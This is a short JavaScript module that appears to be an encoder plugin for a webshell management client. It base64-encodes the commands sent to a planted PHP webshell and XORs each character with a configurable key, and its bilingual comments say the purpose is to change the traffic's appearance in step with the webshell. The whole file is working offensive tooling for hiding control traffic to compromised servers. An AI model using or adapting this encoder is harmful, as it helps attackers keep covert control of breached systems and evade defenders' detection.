/**
 * php::x1_xor_encoder
 * Create at: 2020/11/19 16:39:55
 * Author: Xiaopan233
 */

'use strict';
module.exports = (pwd, data, ext={}) => {
  // $number is the value to XOR with the traffic.After modification, the traffic will be different.You must config it be consistent with Webshell.
  // $number变量为与流量异或的值 修改后流量会变得不一样。必须配置与Webshell端一致
  var number = 2
  //
  var res = ''
  var d = btoa(data['_'])
  for (var i=0;i<d.length;i++) {
    var t = d[i].charCodeAt()
    t = t^number;
    res += t
    res += '/'
  }
  data[pwd] = res
  delete data['_'];
  return data;
}